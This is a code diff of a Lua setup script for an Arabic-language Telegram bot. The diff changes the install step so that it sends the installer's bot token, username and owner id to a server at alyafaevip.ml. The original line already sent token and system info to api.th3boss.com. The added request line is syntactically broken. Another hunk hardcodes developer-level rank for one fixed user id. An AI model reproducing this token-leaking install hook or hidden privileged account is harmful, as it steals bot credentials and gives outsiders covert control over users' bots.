@@ -79,7 +79,7 @@ boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","https://api.th3boss.com/",
+boss..":ApiSource","https://alyafaevip.ml/LHB/index.php/",
 boss..":NameBot:","ياقوت",
 "TH3BOSS_INSTALL","Yes"
 )
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
+https.request( https://alyafaevip.ml/LHB/index.php?token= ..Token.. &username=@ ..GetUser.result.username.. &id= ..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -290,8 +290,8 @@ return false
 end 
 
 if msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851  then 
-msg.TheRankCmd = 'مطور السورس'
-msg.TheRank = 'مطور السورس'
+msg.TheRankCmd = 'مطور البوت '
+msg.TheRank = 'مطور البوت '
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
